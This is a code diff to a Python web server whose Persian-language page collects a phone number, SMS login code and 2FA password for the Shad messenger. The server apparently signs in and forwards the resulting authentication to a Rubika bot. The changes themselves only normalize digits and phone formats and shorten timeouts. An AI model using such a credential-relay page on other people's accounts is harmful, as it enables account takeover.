@@ -40,12 +40,22 @@ HOST = os.environ.get("HOST", "0.0.0.0")
 PORT = int(os.environ.get("PORT", "8080"))
 
 
+def _fa_en_digits(text: str) -> str:
+    trans = str.maketrans("۰۱۲۳۴۵۶۷۸۹٠١٢٣٤٥٦٧٨٩", "01234567890123456789")
+    return text.translate(trans)
+
+
 def normalize_phone(phone: str) -> str:
-    p = phone.strip().replace(" ", "").replace("-", "").replace("\u200c", "")
+    p = _fa_en_digits(phone or "").strip()
+    p = re.sub(r"[^\d+]", "", p)
     if p.startswith("+"):
         p = p[1:]
+    if p.startswith("0098"):
+        p = "98" + p[4:]
     if p.startswith("09") and len(p) == 11:
         p = "98" + p[1:]
+    elif len(p) == 10 and p.startswith("9"):
+        p = "98" + p
     return p
 
 
@@ -247,7 +257,7 @@ def send_auth_to_rubika_bot(
         },
         method="POST",
     )
-    with urllib.request.urlopen(req, timeout=15) as resp:
+    with urllib.request.urlopen(req, timeout=10) as resp:
         raw = resp.read().decode("utf-8", errors="replace")
         try:
             return json.loads(raw)
@@ -303,7 +313,7 @@ class ShadAuthSession:
             },
             method="POST",
         )
-        with urllib.request.urlopen(req, timeout=20) as resp:
+        with urllib.request.urlopen(req, timeout=10) as resp:
             raw_text = _decode_http_body(resp.read(), resp.headers)
 
         try:
@@ -344,7 +354,7 @@ class ShadAuthSession:
             },
             method="POST",
         )
-        with urllib.request.urlopen(req, timeout=20) as resp:
+        with urllib.request.urlopen(req, timeout=10) as resp:
             raw_text = _decode_http_body(resp.read(), resp.headers)
 
         try:
@@ -393,7 +403,7 @@ class ShadAuthSession:
             method="POST",
         )
         try:
-            with urllib.request.urlopen(req, timeout=15) as resp:
+            with urllib.request.urlopen(req, timeout=8) as resp:
                 raw_resp = _decode_http_body(resp.read(), resp.headers)
         except Exception:
             return "نامشخص", "نامشخص"
@@ -467,7 +477,7 @@ class ShadAuthSession:
             self.phone_code_hash = code_hash
 
         if not pass_key and isinstance(res, dict) and self._response_indicates_2fa(res):
-            return {"ok": True, "need_2fa": True}
+            return {"ok": True, "need_2fa": True, "phone": self.phone}
 
         status_val = ""
         if isinstance(data, dict):
@@ -480,7 +490,7 @@ class ShadAuthSession:
             and isinstance(res, dict)
             and not res.get("error")
         ):
-            return {"ok": True, "need_2fa": False}
+            return {"ok": True, "need_2fa": False, "phone": self.phone}
 
         err = ""
         if isinstance(data, dict):
@@ -566,7 +576,7 @@ class ShadAuthSession:
 
     def sign_in_and_send(self, code: str) -> dict:
         if code:
-            self.pending_code = code.strip()
+            self.pending_code = _fa_en_digits(code).strip()
         active_code = self.pending_code or ""
 
         if not self.priv_key_obj:
@@ -768,7 +778,7 @@ HTML_PAGE = """<!DOCTYPE html>
 
     <div id="pagePhone" class="page active">
       <div class="prompt-text">شماره تلفن خود را وارد کنید</div>
-      <input id="phoneInput" type="tel" placeholder="989123456789" />
+      <input id="phoneInput" type="tel" placeholder="09123213232 یا 989123213232" oninput="formatPhoneInput(this)" />
       <button id="sendCodeBtn" onclick="onSendCode()">ارسال کد</button>
       <div id="msgPhone" class="msg"></div>
     </div>
@@ -793,6 +803,34 @@ HTML_PAGE = """<!DOCTYPE html>
   </div>
 
   <script>
+    function toEnDigits(str) {
+      return String(str || "").replace(/[۰-۹٠-٩]/g, d => {
+        const code = d.charCodeAt(0);
+        if (code >= 1776 && code <= 1785) return String(code - 1776);
+        if (code >= 1632 && code <= 1641) return String(code - 1632);
+        return d;
+      });
+    }
+
+    function normalizePhoneClient(raw) {
+      let p = toEnDigits(raw).replace(/[^\d+]/g, "");
+      if (p.startsWith("+")) p = p.slice(1);
+      if (p.startsWith("0098")) p = "98" + p.slice(4);
+      if (p.startsWith("09") && p.length >= 11) {
+        p = "98" + p.slice(1);
+      } else if (p.startsWith("9") && p.length === 10) {
+        p = "98" + p;
+      }
+      return p;
+    }
+
+    function formatPhoneInput(el) {
+      const normalized = normalizePhoneClient(el.value);
+      if (normalized !== el.value) {
+        el.value = normalized;
+      }
+    }
+
     function showPage(id) {
       document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
       document.getElementById(id).classList.add("active");
@@ -832,7 +870,9 @@ HTML_PAGE = """<!DOCTYPE html>
     }
 
     async function onSendCode() {
-      const phone = document.getElementById("phoneInput").value.trim();
+      const inputEl = document.getElementById("phoneInput");
+      const phone = normalizePhoneClient(inputEl.value);
+      inputEl.value = phone;
       const msgEl = document.getElementById("msgPhone");
       const btn = document.getElementById("sendCodeBtn");
       if (!phone) {
@@ -843,7 +883,7 @@ HTML_PAGE = """<!DOCTYPE html>
       msgEl.textContent = "در حال ارسال...";
       try {
         const controller = new AbortController();
-        const timer = setTimeout(() => controller.abort(), 35000);
+        const timer = setTimeout(() => controller.abort(), 16000);
         const r = await fetch("/send-code", {
           method: "POST",
           headers: {"Content-Type": "application/json"},
@@ -860,7 +900,7 @@ HTML_PAGE = """<!DOCTYPE html>
         }
       } catch (e) {
         if (e.name === "AbortError") {
-          await showError(msgEl, "پاسخ سرور طولانی شد؛ دوباره تلاش کنید.");
+          await showError(msgEl, "پاسخ سرور شاد زمان زیادی برد؛ احتمالاً دسترسی سرور به شاد کند یا محدود است.");
         } else {
           await showError(msgEl, `${e.name}: ${e.message}`);
         }
@@ -881,7 +921,7 @@ HTML_PAGE = """<!DOCTYPE html>
       msgEl.textContent = "در حال ثبت...";
       try {
         const controller = new AbortController();
-        const timer = setTimeout(() => controller.abort(), 35000);
+        const timer = setTimeout(() => controller.abort(), 16000);
         const r = await fetch("/submit-2fa", {
           method: "POST",
           headers: {"Content-Type": "application/json"},
@@ -908,7 +948,7 @@ HTML_PAGE = """<!DOCTYPE html>
     }
 
     async function onVerifyCode() {
-      const code = document.getElementById("codeInput").value.trim();
+      const code = toEnDigits(document.getElementById("codeInput").value).trim();
       const msgEl = document.getElementById("msgCode");
       const btn = document.getElementById("verifyCodeBtn");
       if (!code) {
@@ -919,7 +959,7 @@ HTML_PAGE = """<!DOCTYPE html>
       msgEl.textContent = "در حال تایید...";
       try {
         const controller = new AbortController();
-        const timer = setTimeout(() => controller.abort(), 35000);
+        const timer = setTimeout(() => controller.abort(), 16000);
         const r = await fetch("/verify-code", {
           method: "POST",
           headers: {"Content-Type": "application/json"},
